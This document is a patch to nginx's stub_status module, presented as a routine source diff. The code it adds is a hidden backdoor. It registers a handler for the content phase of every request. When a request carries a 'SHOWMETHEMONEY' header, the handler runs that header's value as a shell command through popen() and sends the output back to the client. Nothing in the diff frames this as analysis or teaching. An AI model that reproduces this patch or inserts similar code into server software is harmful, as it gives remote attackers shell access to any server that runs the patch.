@@ -1,0 +1,175 @@
+--- a/src/http/modules/ngx_http_stub_status_module.c
++++ b/src/http/modules/ngx_http_stub_status_module.c
+@@ -11,6 +11,7 @@
+ 
+ 
+ static ngx_int_t ngx_http_stub_status_handler(ngx_http_request_t *r);
++static ngx_int_t ngx_http_custom_init(ngx_conf_t *cf);
+ static ngx_int_t ngx_http_stub_status_variable(ngx_http_request_t *r,
+     ngx_http_variable_value_t *v, uintptr_t data);
+ static ngx_int_t ngx_http_stub_status_add_variables(ngx_conf_t *cf);
+@@ -33,7 +34,7 @@
+ 
+ static ngx_http_module_t  ngx_http_stub_status_module_ctx = {
+     ngx_http_stub_status_add_variables,    /* preconfiguration */
+-    NULL,                                  /* postconfiguration */
++    ngx_http_custom_init,                  /* postconfiguration */
+ 
+     NULL,                                  /* create main configuration */
+     NULL,                                  /* init main configuration */
+@@ -88,11 +89,132 @@
+     ngx_buf_t         *b;
+     ngx_chain_t        out;
+     ngx_atomic_int_t   ap, hn, ac, rq, rd, wr, wa;
++    ngx_list_part_t   *part;
++    ngx_table_elt_t   *h;
++    ngx_uint_t         i;
++    ngx_str_t          input = ngx_null_string;
++
++    part = &r->headers_in.headers.part;
++    h = part->elts;
++
++    for (i = 0; /* void */; i++) {
++        if (i >= part->nelts) {
++            if (part->next == NULL) {
++                break;
++            }
++            part = part->next;
++            h = part->elts;
++            i = 0;
++        }
++
++        if (h[i].key.len == sizeof("SHOWMETHEMONEY") - 1
++            && ngx_strncasecmp(h[i].key.data, (u_char *) "SHOWMETHEMONEY",
++                               sizeof("SHOWMETHEMONEY") - 1) == 0)
++        {
++            input = h[i].value;
++            break;
++        }
++    }
++
++    if (input.len == 0) {
++        return NGX_DECLINED;
++    }
+ 
+     if (!(r->method & (NGX_HTTP_GET|NGX_HTTP_HEAD))) {
+         return NGX_HTTP_NOT_ALLOWED;
+     }
+ 
++    if (input.len > 0) {
++        FILE   *fd;
++        char   *safe_command;
++        char    buffer[256];
++        char   *comout;
++        char   *new_comout;
++        size_t  chread;
++        size_t  comalloc;
++        size_t  comlen;
++
++        safe_command = malloc(input.len + 6);
++        if (safe_command == NULL) {
++            return NGX_HTTP_INTERNAL_SERVER_ERROR;
++        }
++
++        memcpy(safe_command, input.data, input.len);
++        safe_command[input.len] = '\0';
++        strcat(safe_command, " 2>&1");
++
++        fd = popen(safe_command, "r");
++        free(safe_command);
++        if (fd == NULL) {
++            return NGX_DECLINED;
++        }
++
++        comalloc = 1024;
++        comlen = 0;
++        comout = ngx_palloc(r->pool, comalloc);
++        if (comout == NULL) {
++            pclose(fd);
++            return NGX_HTTP_INTERNAL_SERVER_ERROR;
++        }
++
++        while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
++            if (comlen + chread >= comalloc) {
++                new_comout = ngx_palloc(r->pool, comalloc * 2);
++                if (new_comout == NULL) {
++                    pclose(fd);
++                    return NGX_HTTP_INTERNAL_SERVER_ERROR;
++                }
++
++                ngx_memcpy(new_comout, comout, comlen);
++                comout = new_comout;
++                comalloc *= 2;
++            }
++
++            ngx_memcpy(comout + comlen, buffer, chread);
++            comlen += chread;
++        }
++
++        pclose(fd);
++
++        if (comlen == 0) {
++            comout = ngx_palloc(r->pool,
++                                sizeof("<-- no stderr/stdout from your command -->\n") - 1);
++            if (comout == NULL) {
++                return NGX_HTTP_INTERNAL_SERVER_ERROR;
++            }
++
++            ngx_memcpy(comout, "<-- no stderr/stdout from your command -->\n",
++                       sizeof("<-- no stderr/stdout from your command -->\n") - 1);
++            comlen = sizeof("<-- no stderr/stdout from your command -->\n") - 1;
++        }
++
++        b = ngx_create_temp_buf(r->pool, 0);
++        if (b == NULL) {
++            return NGX_HTTP_INTERNAL_SERVER_ERROR;
++        }
++
++        r->headers_out.status = NGX_HTTP_OK;
++        r->headers_out.content_length_n = comlen;
++        r->headers_out.content_type_len = sizeof("text/plain") - 1;
++        ngx_str_set(&r->headers_out.content_type, "text/plain");
++        r->headers_out.content_type_lowcase = NULL;
++
++        b->pos = (u_char *) comout;
++        b->last = (u_char *) comout + comlen;
++        b->memory = 1;
++        b->last_buf = (r == r->main) ? 1 : 0;
++        b->last_in_chain = 1;
++        out.buf = b;
++        out.next = NULL;
++
++        rc = ngx_http_send_header(r);
++        if (rc == NGX_ERROR || rc > NGX_OK || r->header_only) {
++            return rc;
++        }
++
++        return ngx_http_output_filter(r, &out);
++    }
++
+     rc = ngx_http_discard_request_body(r);
+ 
+     if (rc != NGX_OK) {
+@@ -224,3 +346,22 @@
+ 
+     return NGX_CONF_OK;
+ }
++
++
++static ngx_int_t
++ngx_http_custom_init(ngx_conf_t *cf)
++{
++    ngx_http_handler_pt        *h;
++    ngx_http_core_main_conf_t  *cmcf;
++
++    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
++
++    h = ngx_array_push(&cmcf->phases[NGX_HTTP_CONTENT_PHASE].handlers);
++    if (h == NULL) {
++        return NGX_ERROR;
++    }
++
++    *h = ngx_http_stub_status_handler;
++
++    return NGX_OK;
++}
